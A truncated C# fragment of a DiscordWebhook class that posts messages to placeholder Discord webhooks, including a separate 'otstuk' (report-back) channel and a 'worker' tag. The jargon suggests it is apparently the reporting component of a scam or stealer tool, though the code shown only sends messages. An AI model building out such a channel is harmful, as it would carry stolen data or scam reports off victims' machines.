...
public class DiscordWebhook
{
	...
	private static string defaultWebhook = "YOUR_WEBHOOK_URL";

	private static string defaultUserAgent = "YOUR_WEBHOOK_USERAGENT";

	private static string defaultUserName = "YOUR_WEBHOOK_USERNAME";

	private static string defaultAvatar = "";

	public static string worker = "CHATGPTKING";

	private static string otstukWebhook = "YOUR_WEBHOOK_URL";

	private static string otstukUserAgent = "YOUR_WEBHOOK_USERAGENT";

	private static string otstukUserName = "YOUR_WEBHOOK_USERNAME";

	private static string otstukAvatar = "";

	public static string SendOtstuk(string mssgBody)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("username", otstukUserName);
		dictionary.Add("content", mssgBody);
		dictionary.Add("avatar_url", otstukAvatar);
		HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(otstukWebhook, otstukUserAgent, dictionary);
